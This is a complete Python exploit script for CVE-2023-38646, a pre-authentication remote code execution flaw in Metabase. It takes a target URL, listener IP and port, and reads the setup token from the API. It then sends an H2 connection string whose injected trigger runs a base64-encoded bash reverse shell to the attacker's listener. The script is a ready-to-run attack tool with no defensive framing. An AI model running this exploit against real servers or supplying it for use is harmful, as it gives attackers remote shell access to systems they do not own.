import argparse
import requests
import base64
import random
import json
import string

class Metabase():
    def __init__(self,target,lhost,lport):
        self.url = self.check_url(target)
        self.lhost = lhost
        self.lport = lport
        self.token = self.get_token()
        self.exploit()

    def check_url(self,target):
        check = target[-1]
        if check == "/": 
            return target
        else:
            fixed_url = target + "/"
            return fixed_url

    def get_token(self):
        print("Getting token")
        url = self.url + "api/session/properties"
        request = requests.get(url)
        data = request.json()
        token = data["setup-token"]
        print("Got token: " + token)

        return token

    def exploit(self):
        print("Sending payload")
        rev = "bash -i >&/dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1"
        encoded_bytes = base64.b64encode(rev.encode('utf-8'))
        rev_encoded = encoded_bytes.decode('utf-8')
        
        url = self.url + "api/setup/validate"

        characters = string.ascii_letters + string.digits
        random_string1 = ''.join(random.choice(characters) for _ in range(6))
        random_string2 = ''.join(random.choice(characters) for _ in range(6))

        data = {
                "token":self.token,
                "details":{
                    #"is_on_demand": "false",
                    #"is_full_sync": "false",
                    #"is_sample": "false",
                    #"cache_ttl": "null",
                    #"refingerprint": "false",
                    #"auto_run_queries": "true",
                    #"schedules":{},
                    "details":{
                        "db":"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER " + random_string1 + " BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + rev_encoded + "}|{base64,-d}|{bash,-i}')\n$$--=x",
                        "advanced-option":"false",
                        "ssl":"true"
                        },
                    "name":random_string2,
                    "engine":"h2"
                    }
                }

        headers={
                "Content-Type":"application/json"
                }
        json_data = json.dumps(data)
        r = requests.post(url,data=json_data,headers=headers)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='CVE-2023-38646 Metabase Pre-Auth Remote Code Execution')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://metbase.url/', required=True)
    parser.add_argument('-l', metavar='<Listener IP>',help="Example: -l 127.0.0.1", required=True) 
    parser.add_argument('-p', metavar='<Listener Port>',help="Example: -p 9001", required=True)
    args = parser.parse_args()
    
    try:
        print('CVE-2023-38646 Metabase Pre-Auth Remote Code Execution')
        Metabase(args.t,args.l,args.p)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()